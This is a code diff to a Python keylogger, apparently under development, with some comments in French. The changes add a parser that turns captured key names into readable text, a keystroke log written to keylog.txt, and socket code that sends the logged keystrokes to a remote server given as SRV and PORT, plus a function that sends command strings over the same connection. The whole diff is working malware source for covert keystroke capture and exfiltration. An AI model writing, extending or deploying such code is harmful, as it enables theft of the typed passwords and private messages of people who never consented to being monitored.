@@ -19,11 +19,21 @@ def argument():
 TXT_GLOB = ""
 
 
+def kill_all() :
+    print( "tout tuer ")
+
+def parse(str):
+    new_str = str.replace("'", "")
+    new_str = new_str.replace("Key.space"," ")
+    new_str = new_str.replace("Key.backspace","<-")
+    new_str = new_str.replace("Key.enter","\n")
+    return new_str
+
 def kpr(key):
         global TXT_GLOB
         with open("keylog.txt", "a") as f:
-            f.write(f"{key} ")
-            TXT_GLOB += str(key)
+            f.write(parse(str(key)))
+            TXT_GLOB += parse(str(key))
 
 
 
@@ -49,14 +59,28 @@ def keylogger():
 
 
 def send(data):
+    try :
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+        client_socket.connect((SRV, PORT))
+
+        client_socket.send(data.encode('utf-8')) ##envoi
+
+        client_socket.close()
+    except :
+        kill_all()
+
+    #print(data)
+
+
+def commands(cmd):
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     client_socket.connect((SRV, PORT))
 
-    client_socket.send(data.encode('utf-8')) ##envoi
+    client_socket.send(cmd.encode('utf-8'))  ##envoi
 
     client_socket.close()
-    #print(data)
 
 
 
